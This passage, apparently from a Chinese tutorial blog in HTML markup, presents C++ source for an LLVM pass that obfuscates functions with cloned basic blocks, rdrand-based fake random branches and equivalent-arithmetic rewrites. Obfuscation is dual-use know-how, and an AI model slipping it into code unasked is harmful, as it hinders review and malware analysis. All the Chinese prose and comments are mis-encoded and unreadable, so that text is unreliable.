href="#ç¬¬å››æ­¥ï¼šæ„é€ è™šå‡éšæœºè·³è½¬" class="headerlink" title="ç¬¬å››æ­¥ï¼šæ„é€ è™šå‡éšæœºè·³è½¬"></a>ç¬¬å››æ­¥ï¼šæ„é€ è™šå‡éšæœºè·³è½¬</h3><p>åœ¨<code>bodyBB</code>å’Œ<code>cloneBB</code>åæ’å…¥è™šå‡éšæœºè·³è½¬æŒ‡ä»¤ï¼ˆå®é™…ä¸Šä»ç„¶ä¼šç›´æ¥è·³è½¬åˆ°<code>endBB</code>ï¼‰ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230227161159175.png" alt="image-20230227161159175"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ·»åŠ  bodyBB åˆ° bodyBB.clone çš„è™šå‡éšæœºè·³è½¬</span></span><br><span class="line">bodyBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="built_in">insertRandomBranch</span>(randVar, endBB, cloneBB, bodyBB);</span><br><span class="line"><span class="comment">// æ·»åŠ  bodyBB.clone åˆ° bodyBB çš„è™šå‡éšæœºè·³è½¬</span></span><br><span class="line">cloneBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="built_in">insertRandomBranch</span>(randVar, bodyBB, endBB, cloneBB);</span><br></pre></td></tr></table></figure><h1 id="éšæœºæ§åˆ¶æµä»£ç å®ç°"><a href="#éšæœºæ§åˆ¶æµä»£ç å®ç°" class="headerlink" title="éšæœºæ§åˆ¶æµä»£ç å®ç°"></a>éšæœºæ§åˆ¶æµä»£ç å®ç°</h1><h2 id="RandomControlFlow-cpp"><a href="#RandomControlFlow-cpp" class="headerlink" title="RandomControlFlow.cpp"></a>RandomControlFlow.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Local.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Intrinsics.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/IntrinsicsX86.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;SplitBasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ··æ·†æ¬¡æ•°ï¼Œæ··æ·†æ¬¡æ•°è¶Šå¤šæ··æ·†ç»“æœè¶Šå¤æ‚</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">obfuTimes</span><span class="params">(<span class="string">&quot;rcf_loop&quot;</span>, cl::init(<span class="number">1</span>), cl::desc(<span class="string">&quot;Obfuscate a function &lt;bcf_loop&gt; time(s).&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">RandomControlFlow</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RandomControlFlow</span>() : <span class="built_in">FunctionPass</span>(ID)&#123;</span><br><span class="line">            <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ç»„ç­‰æ•ˆäº origVar çš„æŒ‡ä»¤</span></span><br><span class="line">        <span class="function">Value* <span class="title">alterVal</span><span class="params">(Value *origVar,BasicBlock *insertAfter)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">insertRandomBranch</span><span class="params">(Value *randVar, BasicBlock *ifTrue, BasicBlock *ifFalse, BasicBlock *insertAfter)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»¥åŸºæœ¬å—ä¸ºå•ä½è¿›è¡Œéšæœºæ§åˆ¶æµæ··æ·†</span></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">randcf</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">RandomControlFlow::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="built_in">INIT_CONTEXT</span>(F);</span><br><span class="line">    FunctionPass *pass = <span class="built_in">createSplitBasicBlockPass</span>();</span><br><span class="line">    pass-&gt;<span class="built_in">runOnFunction</span>(F);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; obfuTimes;i ++)&#123;</span><br><span class="line">        vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">            origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">            <span class="built_in">randcf</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RandomControlFlow::insertRandomBranch</span><span class="params">(Value *randVar, BasicBlock *ifTrue, BasicBlock *ifFalse, BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å¯¹éšæœºæ•°è¿›è¡Œç­‰ä»·å˜æ¢</span></span><br><span class="line">    Value *alteredRandVar = <span class="built_in">alterVal</span>(randVar, insertAfter);</span><br><span class="line">    <span class="comment">// and 1 == % 2</span></span><br><span class="line">    <span class="comment">// Value *randMod2 = BinaryOperator::CreateURem(alteredRandVar, CONST_I32(2), &quot;&quot;, insertAfter);</span></span><br><span class="line">    Value *randMod2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::And, alteredRandVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    ICmpInst *condition = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, ICmpInst::ICMP_EQ, randMod2, <span class="built_in">CONST_I32</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="comment">// è·³è½¬åˆ°ä¸åŒåŸºæœ¬å—</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(ifTrue, ifFalse, condition, insertAfter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">RandomControlFlow::randcf</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// æ‹†åˆ†å¾—åˆ° entryBB, bodyBB, endBB</span></span><br><span class="line">    <span class="comment">// å…¶ä¸­æ‰€æœ‰çš„ PHI æŒ‡ä»¤éƒ½åœ¨ entryBB(å¦‚æœæœ‰çš„è¯)</span></span><br><span class="line">    <span class="comment">// endBB åªåŒ…å«ä¸€æ¡ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">    BasicBlock *entryBB = BB;</span><br><span class="line">    BasicBlock *bodyBB = entryBB-&gt;<span class="built_in">splitBasicBlock</span>(BB-&gt;<span class="built_in">getFirstNonPHIOrDbgOrLifetime</span>(), <span class="string">&quot;bodyBB&quot;</span>);</span><br><span class="line">    BasicBlock *endBB = bodyBB-&gt;<span class="built_in">splitBasicBlock</span>(bodyBB-&gt;<span class="built_in">getTerminator</span>(), <span class="string">&quot;endBB&quot;</span>);</span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">createCloneBasicBlock</span>(bodyBB);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨ entryBB åæ’å…¥éšæœºè·³è½¬ï¼Œä½¿å…¶èƒ½å¤Ÿéšæœºè·³è½¬åˆ°ç¬¬ bodyBB æˆ–å…¶å…‹éš†åŸºæœ¬å— cloneBB</span></span><br><span class="line">    entryBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    <span class="comment">// è·å– rdrand å‡½æ•°</span></span><br><span class="line">    Function *rdrand = Intrinsic::<span class="built_in">getDeclaration</span>(entryBB-&gt;<span class="built_in">getModule</span>(), Intrinsic::x86_rdrand_32);</span><br><span class="line">    <span class="comment">// æ–°å»º call æŒ‡ä»¤è°ƒç”¨ rdrand å‡½æ•°ï¼Œè¿”å›ç»“æœæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¯¥å‡½æ•°æ˜¯å¦è°ƒç”¨æˆåŠŸ</span></span><br><span class="line">    CallInst *randVarStruct = CallInst::<span class="built_in">Create</span>(rdrand-&gt;<span class="built_in">getFunctionType</span>(), rdrand, <span class="string">&quot;&quot;</span>, entryBB);</span><br><span class="line">    <span class="comment">// é€šè¿‡ rdrand å†…ç½®å‡½æ•°è·å–éšæœºæ•°</span></span><br><span class="line">    Value *randVar = ExtractValueInst::<span class="built_in">Create</span>(randVarStruct, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, entryBB);</span><br><span class="line">    <span class="built_in">insertRandomBranch</span>(randVar, bodyBB, cloneBB, entryBB);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ  bodyBB åˆ° bodyBB.clone çš„è™šå‡éšæœºè·³è½¬</span></span><br><span class="line">    bodyBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    <span class="built_in">insertRandomBranch</span>(randVar, endBB, cloneBB, bodyBB);</span><br><span class="line">    <span class="comment">// æ·»åŠ  bodyBB.clone åˆ° bodyBB çš„è™šå‡éšæœºè·³è½¬</span></span><br><span class="line">    cloneBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    <span class="built_in">insertRandomBranch</span>(randVar, bodyBB, endBB, cloneBB);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Value* <span class="title">RandomControlFlow::alterVal</span><span class="params">(Value *startVar,BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> code = <span class="built_in">rand</span>() % <span class="number">3</span>;</span><br><span class="line">    Value *result;</span><br><span class="line">    <span class="keyword">if</span>(code == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// x = x * (x + 1) - x^2</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, op1, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, startVar, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op2, op3, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op4;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// x = 3 * x * (x - 2) - 3 * x^2 + 7 * x</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">2</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op1, op2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, startVar, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op5 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op4, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op6 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, startVar, <span class="built_in">CONST_I32</span>(<span class="number">7</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op7 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op3, op5, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op8 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, op6, op7, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op8;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">// x = (x - 1) * (x + 3) - (x + 4) * (x - 3) - 9</span></span><br><span class="line">        BinaryOperator *op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op2 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op3 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Add, startVar, <span class="built_in">CONST_I32</span>(<span class="number">4</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op4 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, startVar, <span class="built_in">CONST_I32</span>(<span class="number">3</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op5 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op1, op2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op6 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, op3, op4, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op7 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op5, op6, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        BinaryOperator *op8 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, op7, <span class="built_in">CONST_I32</span>(<span class="number">9</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">        result = op8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> RandomControlFlow::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;RandomControlFlow&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;rcf&quot;</span>, <span class="string">&quot;Add random control flow to each function.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Local.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/ValueMapper.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Cloning.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line">LLVMContext *CONTEXT = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">llvm::fixStack</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    vector&lt;PHINode*&gt; origPHI;</span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(PHINode *PN = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">                origPHI.<span class="built_in">push_back</span>(PN);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">                &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(&amp;BB))&#123;</span><br><span class="line">                origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(PHINode *PN : origPHI)&#123;</span><br><span class="line">        <span class="built_in">DemotePHIToStack</span>(PN, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BasicBlock* <span class="title">llvm::createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å…‹éš†ä¹‹å‰å…ˆä¿®å¤æ‰€æœ‰é€ƒé€¸å˜é‡</span></span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = BB-&gt;<span class="built_in">getParent</span>()-&gt;<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">            &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(BB))&#123;</span><br><span class="line">            origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ˜ å°„è¡¨ç±»å‹å˜é‡</span></span><br><span class="line">    ValueToValueMapTy VMap;</span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">CloneBasicBlock</span>(BB, VMap, <span class="string">&quot;cloneBB&quot;</span>, BB-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">    <span class="comment">// å¯¹å…‹éš†åŸºæœ¬å—çš„å¼•ç”¨è¿›è¡Œä¿®å¤</span></span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *cloneBB)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>();i ++)&#123;</span><br><span class="line">            Value *V = <span class="built_in">MapValue</span>(I.<span class="built_in">getOperand</span>(i), VMap);</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜ å°„å‡ºæ¥ä¸ä¸ºç©ºï¼Œï¼ˆæˆåŠŸï¼‰</span></span><br><span class="line">            <span class="keyword">if</span>(V)&#123;</span><br><span class="line">                I.<span class="built_in">setOperand</span>(i, V);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cloneBB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Utils-h"><a href="#Utils-h" class="headerlink" title="Utils.h"></a>Utils.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UTILS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UTILS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="comment">// è·å–å½“å‰å‡½æ•° context</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CONTEXT(F) CONTEXT=&amp;F.getContext()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_I32 Type::getInt32Ty(*CONTEXT)</span></span><br><span class="line"><span class="comment">// åˆ›å»ºå¸¸é‡</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_I32(V) ConstantInt::get(TYPE_I32, V, false)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST(T, V) ConstantInt::get(T, V)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> llvm::LLVMContext *CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹ PHI æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡è¿›è¡Œä¿®å¤å‡½æ•°ï¼Œæ·»åŠ åˆ°å‘½åç©ºé—´ llvm é‡Œ</span></span><br><span class="line"><span class="keyword">namespace</span> llvm&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fixStack</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">    <span class="function">BasicBlock* <span class="title">createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
